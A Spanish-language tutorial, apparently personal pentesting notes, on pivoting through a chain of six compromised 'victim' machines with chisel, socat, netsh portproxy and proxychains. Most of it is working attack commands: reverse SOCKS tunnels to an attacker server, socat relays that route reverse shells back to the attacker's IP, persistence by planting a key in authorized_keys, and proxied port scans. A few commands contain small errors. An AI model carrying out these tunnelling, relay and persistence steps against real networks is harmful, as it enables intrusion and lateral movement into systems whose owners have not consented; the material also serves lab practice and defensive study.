

# Pivoting con chisel 


Lo primero que tenemos que hacer es descargar el binario de Chisel. Para ello, nos dirigimos al siguiente enlace: [https://github.com/jpillora/chisel/releases](https://github.com/jpillora/chisel/releases). Dentro de este enlace, seleccionamos la versión más actual que sea correspondiente a nuestro sistema operativo. Esto nos descargará un archivo comprimido, el cual al descomprimirlo contendrá el binario correspondiente.


Tenemos un ejemplo donde hay una máquina víctima 2 que se encuentra en un segmento de red distinto al de la máquina atacante, y solo se puede acceder a ella a través de la máquina víctima 1, a la cual tenemos acceso ya que se encuentra en el mismo segmento de red que la máquina atacante. Sin embargo, la máquina víctima 1 tiene otra interfaz que comparte con la máquina víctima 2. Entonces, si queremos tener visibilidad con las IPs de la máquina víctima 2 en la máquina atacante, lo primero que debemos hacer es compartir el binario de Chisel a nuestra máquina víctima 1 de cualquier forma. Después, en nuestra máquina atacante, ejecutamos el siguiente comando:


```bash 
./chisel server --reserve -p puerto 
```

Este comando ejecuta el servidor Chisel y reserva el puerto especificado para la conexión. Una vez que el servidor está en funcionamiento en nuestra máquina atacante, si deseamos acceder a un puerto específico de la máquina víctima 2 desde la máquina atacante, podemos ejecutar el siguiente comando desde la máquina víctima 1.

```bash
./chisel client ip_servidor:puerto R:puerto_maquina_victima_2:ip_maquina_victima_2:puerto_maquina_atacante
```

Este comando establece una conexión con un servidor Chisel remoto y crea un túnel hacia la máquina víctima 2 a través de la máquina víctima 1. Si, en cambio, queremos obtener acceso a todas las IPs configuradas en el mismo segmento de red que la máquina víctima 1, podemos ejecutar el siguiente comando.


```bash 
./chisel client ip_servidor:puerto R:socks
```


Este comando establece una conexión con un servidor Chisel remoto y configura un túnel de tipo SOCKS. Por defecto, el túnel SOCKS se encuentra en el puerto 1080. Ahora, lo que tenemos que hacer es abrir en nuestra máquina atacante el archivo `/etc/proxychains.conf`, donde al final solo tendrás que agregar la siguiente línea.


```
sock5 127.0.0.1 1080
```


Entonces, al usar proxychains, este leerá del archivo previamente configurado, se conectará a través del localhost en el puerto 1080, y al establecer la conexión, permitirá la conectividad con un segmento que previamente no estaba visible. Ahora podemos ejecutar un comando para escanear los puertos de una dirección IP que antes no era accesible desde la máquina atacante. El comando es el siguiente:


```bash
proxychains nmap -sT -Pn -p- -open -T5 -v -n ip 2> /dev/null 
```

Este comando ejecuta `nmap` a través de `proxychains` para realizar un escaneo de puertos en una dirección IP específica. Probablemente el escaneo vaya algo lento debido a la naturaleza secuencial del proceso. Para hacerlo más eficiente, podemos ejecutarlo de la siguiente manera:

```bash
seq 1 65335 | xargs -P 500 -I {} proxychains nmap -sT -Pn -p{} -open -T5 -v -n ip 2>&1 | grep "tcp open"
```

Este comando escanea todos los puertos TCP en una dirección IP específica de manera rápida y en paralelo, utilizando `nmap` a través de `proxychains`, y muestra los puertos que están abiertos. El uso de `xargs -P 500` permite realizar múltiples escaneos en paralelo, lo que puede aumentar significativamente la velocidad del proceso.

Algo importante a tener en cuenta es que si ejecutamos un comando relacionado con la máquina sin visibilidad desde la terminal, este comando no funcionará a menos que lo iniciemos precedido por `proxychains`. Esto se debe a que necesariamente requerimos el túnel proporcionado por `proxychains` para establecer la conexión. Además, otra cosa a considerar es que si queremos acceder desde el navegador a esta máquina, tendremos que configurar FoxyProxy. Para ello, primero hacemos clic en 'Opciones' en FoxyProxy.

![[Pasted image 20240430185924.png]]


Luego nos dirigimos a la sección 'proxies' y hacemos clic en el botón 'Añadir'.


![[Pasted image 20240430190101.png]]


Finalmente, creamos el proxy especificando el nombre y el tipo de proxy, que en este caso es SOCKS5. También indicamos dónde se está ejecutando este proxy, que es en localhost en el puerto 1080. Luego, guardamos la configuración.


![[Pasted image 20240430193103.png]]


Una vez seleccionado el proxy, tendrás acceso a la máquina desde el navegador. Si deseas utilizar herramientas como wfuzz o gobuster para enumerar de manera eficiente, no utilices proxychains; en su lugar, utiliza directamente los parámetros correspondientes para integrar el proxy, como se muestra a continuación:

```bash
wfuzz -w wordlist -p ip:puerto:tipo_proxy url
```


```bash
gobuster dir -u url-w wordlist.txt --proxy tipo_proxy://ip:puerto
```

En la máquina víctima 2, parece que hay un servicio ejecutándose en un puerto que utiliza el protocolo UDP. Si deseamos redirigir ese puerto desde la máquina víctima 2 a nuestro servidor, necesitaremos ejecutar el siguiente comando en la máquina víctima 1:

```bash
./chisel client ip_servidor:puerto R:socks R:puerto_maquina_victima_2:ip_maquina_victima_2:puerto_servidor/udp
```

  
Este comando establece una conexión de cliente utilizando Chisel, solicitando un reenvío de tráfico a través de SOCKS y un reenvío de tráfico UDP desde la máquina víctima 2 hacia una dirección IP y puerto específicos a través de nuestro servidor. Si deseas habilitar la conexión desde la máquina víctima 2 a la máquina atacante para compartir archivos, primero deberías copiar el archivo `socat` en la máquina víctima 1, ya que es el nodo más cercano a la máquina víctima 2, estando ambas en el mismo segmento de red. Puedes descargar `socat` desde el siguiente enlace: [enlace a socat](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat). Una vez descargado, muévelo a nuestra máquina víctima 1 con el siguiente comando, para lo cual ya deberías haber establecido la persistencia colocando tu clave pública en el directorio `authorized_keys` de la máquina víctima 1. El comando es el siguiente:


```bash
scp archivo usuario@ip:/directorio/archivo
```


Ya con el archivo copiado en la máquina víctima 1, lo ejecutamos de la siguiente manera:

```bash
socat TCP-LISTEN:puerto_escucha,fork TCP:ip_maquina_atacante:puerto_maquina_atacante 
```

Este comando establece un reenvío de puerto TCP, redirigiendo todas las conexiones entrantes a otra dirección IP y puerto. Entonces, ahora podemos abrir un servidor con Python en la máquina atacante. Desde la máquina víctima 2, nos conectamos al puerto en escucha de la máquina víctima 1, ya que es el nodo más cercano. Una vez conectados, la máquina víctima 1 redirigirá todo su tráfico a la dirección IP de la máquina atacante, permitiendo así que la máquina atacante 2 tenga acceso a la máquina atacante y podremos compartir archivos.


Si deseamos enviar una reverse shell desde la máquina víctima 2 a la máquina atacante, el proceso es similar. Primero, necesitamos estar en modo de escucha en la máquina atacante en cualquier puerto disponible con ayuda de netcat. Luego, usamos un comando similar al anterior, pero este será ejecutado en la máquina víctima 1. En este comando especificamos el puerto y la dirección IP en escucha, a donde enviaremos la reverse shell. En este caso, si queremos enviar la reverse shell desde la máquina víctima 2 a la máquina atacante, el comando sería el siguiente:

```bash 
socat TCP-LISTEN:puerto_escucha,fork TCP:ip_maquina_atacante:puerto_maquina_atacante 
```

Finalmente, enviamos la reverse shell con el típico one-liner al nodo más cercano, en este caso, a la máquina víctima 1, a través del puerto especificado. Al hacer esto, `socat` redirigirá todo a nuestra máquina atacante, estableciendo así una reverse shell.

Al ganar acceso a la máquina víctima 2, parece que tiene otro segmento de red. Al descubrir los hosts de este nuevo segmento, observamos dos equipos: uno con Windows (máquina víctima 4) y otro con Linux (máquina víctima 3). Por lo tanto, necesitaremos crear un túnel de tipo SOCKS5.


Primero, copiaremos Chisel a la máquina víctima 2 de la misma manera que lo hicimos anteriormente, utilizando SCP. Dado que la persistencia debe estar establecida con la ayuda de la clave pública en el directorio authorized_keys, procederemos a hacer visible la máquina víctima 3 desde la máquina atacante. Para ello, ingresaremos a la máquina víctima 1 y ejecutaremos el siguiente comando de Socat:

```bash
socat TCP-LISTEN:puerto_escucha,fork TCP:ip_server_maquina_atacante:puerto_server_maquina_atacante 
```


Este comando redirige todo el tráfico entrante a través del puerto especificado a nuestro servidor, ubicado en la máquina atacante. Entonces, desde la máquina 2, ejecutamos el siguiente comando, el cual solicita un reenvío de tráfico a la máquina 1. Esta última enviará el tráfico a nuestra máquina atacante gracias a Socat.

```bash
./chisel client ip_maquina_vicitma_1:puerto_maquina_vicitma_1 R:puerto_servidor:socks
```


Una vez establecida la conexión, lo que tendremos que hacer es modificar el archivo /etc/proxychains.conf. Para ello, primero tendremos que descomentar la opción 'dynamic_chain' y comentar la opción 'strict_chain'. Luego, colocaremos el último túnel creado arriba del último túnel, algo como esto:

```
socks5 127.0.0.1 puerto_tunel
```


Y listo, así podríamos interactuar con la máquina 3 desde la máquina atacante. Si quisiéramos establecer una reverse shell desde la máquina víctima 3 a la máquina atacante, lo primero que tendríamos que hacer es compartir el socat a la máquina víctima 2 con ayuda de scp. Una vez en la máquina víctima 2, ejecutamos este comando:

```bash
socat TCP-LISTEN:puerto_escucha,fork TCP:ip_maquina_victima_1:puerto_maquina_victima_1
```

Este comando redireccionará todo el tráfico que llegue por un puerto hacia la máquina víctima 1 por el puerto especificado. Ahora, ingresamos a nuestra máquina víctima 1 y ejecutamos el mismo comando, solo que modificamos el puerto de escucha de la máquina víctima 1, como lo indicamos en el comando anterior, y además, en lugar de enviar el tráfico a la máquina víctima 1, lo enviamos a nuestra máquina atacante por un puerto que especificaremos más adelante. El comando de socat será el siguiente:

```bash
socat TCP-LISTEN:puerto_escucha,fork TCP:ip_maquina_atacante:puerto_maquina_atacante
```


Entonces, ahora simplemente nos ponemos en escucha con ayuda de netcat desde la máquina atacante en el puerto especificado en el comando anterior. Finalmente, desde la máquina víctima 3, enviamos la reverse shell con el típico one liner a la máquina víctima 2, y socat hará el resto para redirigir la reverse shell a nuestra máquina atacante. La máquina víctima 3 no parece tener otro segmento de red, así que ahora vamos a investigar la máquina víctima 4, la cual, al parecer, sí cuenta con otro segmento de red donde se encuentra la máquina víctima 5. Entonces, lo que tenemos que hacer primero para tener acceso a esta desde la máquina atacante es ingresar a la máquina víctima 2 y en esta ingresar el siguiente comando de socat, el cual redirigirá todo el tráfico que reciba en un puerto específico a la máquina víctima 1:


```bash
socat TCP-LISTEN:puerto_escucha,fork TCP:ip_maquina_victima_1:puerto_maquina_victima_1
```

Luego, tendremos que ingresar a la máquina víctima 1 y en esta ejecutar un comando muy similar al anterior, solo que indicaremos como puerto en escucha el que mencionamos anteriormente, y vamos a redirigir nuestro tráfico al servidor que se encuentra en la máquina atacante:

```bash
socat TCP-LISTEN:puerto_escucha,fork TCP:ip_server_maquina_atacante:puerto_server_maquina_atacante
```


Descargamos la última versión de chisel, pero en este caso la versión de Windows, desde el siguiente enlace: https://github.com/jpillora/chisel/releases. Después, lo que tenemos que hacer es compartir el chisel a nuestra máquina víctima 4, ya sea por medio de SMB u otro medio, haciendo uso de socat como lo hicimos anteriormente. Una vez con el chisel en nuestra máquina Windows, tendremos que ejecutar este comando, el cual redirecciona todo el tráfico al puerto que abrimos en la máquina víctima 2, y ya con socat, esto redirigirá todo hacia la máquina atacante, haciendo posible la visualización de la máquina víctima 5 en la máquina atacante:


```
.\chisel.exe client ip_maquina_victima_2:puerto_maquina_victima_2 R:puerto:socks
```


Una vez establecida la conexión, lo que tendremos que hacer es ingresar al archivo `/etc/proxychains.conf` y, arriba del último proxy, colocar lo siguiente, pero especificando el puerto donde está el proxy:

```
socks5 127.0.0.1 puerto
```


Cuando obtenemos acceso a la máquina 5, podemos ver que esta tiene otro segmento de red, el cual se comunica con la máquina víctima 6. Entonces, si queremos tener acceso a esta desde la máquina atacante, tenemos que hacer lo siguiente: desde la máquina víctima 4, ya que es una máquina Windows, podemos, en vez de usar socat, usar netsh para así redirigir el tráfico a la máquina víctima 3. El comando sería el siguiente:


```
netsh interface portproxy add v4tov4 listenport=puerto_en_escucha listenaddress=0.0.0.0 connectport=puerto_maquina_victima_2 connectaddress=ip_maquina_victima_2
```


Luego, ingresamos a la máquina víctima 2 y en esta ejecutamos el siguiente comando de socat, el cual redirigirá el tráfico que llegue al puerto especificado en el comando anterior a la máquina víctima 1:

```
socat TCP-LISTEN:puerto_escucha,fork TCP:ip_server_maquina_victima_1:puerto_maquina_victima_1
```


Después, ingresamos a la máquina víctima 1, donde ejecutamos un comando muy parecido al anterior, solo que como puerto de escucha colocamos el puerto al que redirigimos todo el tráfico. Y ahora, lo que entre por ese puerto, lo redirigimos a nuestro servidor en la máquina atacante de la siguiente manera:

```bash
socat TCP-LISTEN:puerto_escucha,fork TCP:ip_server_maquina_atacante:puerto_server_maquina_atacante
```


Finalmente, desde la máquina víctima 5, ejecutamos el siguiente comando, donde indicaremos el puerto de la máquina víctima 4 donde se está en escucha, y ya con ayuda de socat, todo el tráfico se redireccionará a la máquina atacante, haciendo posible que la máquina atacante y la máquina 6 puedan interactuar. El comando es el siguiente:

```bash
./chisel client ip_maquina_victima_5:puerto_maquina_victima_5 R:puerto:socks
```


Una vez creada la conexión del túnel, lo que tenemos que hacer ahora es modificar el archivo `/etc/proxychains`, donde arriba del último proxy configurado tendrás que colocar lo siguiente, pero especificando el puerto donde está el proxy:

```bash
socks5 127.0.0.1 puerto
```



Si quieres configurar un proxy en Burp Suite, lo primero que tienes que hacer es dirigirte a proxy y luego seleccionar la opción de proxy settings.

![[Pasted image 20240504220014.png]]



Dentro de este apartado, nos vamos a Network y luego a Connections, y en la parte de Socks Proxy indicamos el puerto y la dirección, además de seleccionar la opción de "Use SOCKS proxy" donde hemos configurado nuestro proxy.

![[Pasted image 20240504224602.png]]


Ahora, desde nuestro navegador, indicamos que queremos usar el proxy de nuestro Burp Suite, y ya estaríamos interactuando con el proxy.
![[Pasted image 20240504222936.png]]



Si queremos enviar una reverse shell desde la máquina víctima 6 a la máquina atacante, lo primero que tendremos que hacer es desde nuestra máquina atacante ponernos en escucha por un puerto con ayuda de netcat. Luego, compartimos el socat con SCP a nuestra máquina víctima 5. Una vez con este en nuestra máquina, ejecutamos el siguiente comando, en donde mandaremos todo el tráfico al nodo más cercano, en este caso, a la máquina 4 por un puerto especificado. El comando sería el siguiente:

```bash
socat TCP-LISTEN:puerto_escucha,fork TCP:ip_maquina_victima_4:puerto_maquina_victima_4
```


Ahora, ingresamos a la máquina víctima 4 y en esta ejecutamos el siguiente comando, el cual va a mandar el tráfico recibido desde el puerto especificado en el anterior comando a la máquina víctima 2 por un puerto especificado. El comando es el siguiente:


```
netsh interface portproxy add v4tov4 listenport=puerto_en_escucha listenaddress=0.0.0.0 connectport=puerto_maquina_victima_2 connectaddress=ip_maquina_victima_2
```



Ingresamos a la máquina víctima 2 y en esta ejecutamos el siguiente comando de socat, en el cual vamos a indicar como puerto en escucha el puerto al que mandamos todo el tráfico en el anterior comando, y este tráfico se lo vamos a mandar a la máquina víctima 1:


```bash
socat TCP-LISTEN:puerto_escucha,fork TCP:ip_maquina_victima_1:puerto_maquina_victima_1
```


Desde la máquina víctima 1, ahora ejecutamos casi el mismo comando, solo que ahora como puerto de escucha indicamos el mismo puerto que se configuró en el anterior comando, al cual le mandamos todo el tráfico. También indicamos a dónde debemos mandar este tráfico, en este caso, lo debemos mandar a nuestra máquina atacante por el puerto en el que estamos en escucha. El comando sería el siguiente:

```bash
socat TCP-LISTEN:puerto_escucha,fork TCP:ip_maquina_atacante:puerto_maquina_atacante
```


Ahora, mandamos nuestra reverse shell desde la máquina víctima 6 a la máquina víctima 5 por el puerto especificado, y gracias a socat, la reverse shell debería llegar a la máquina atacante.



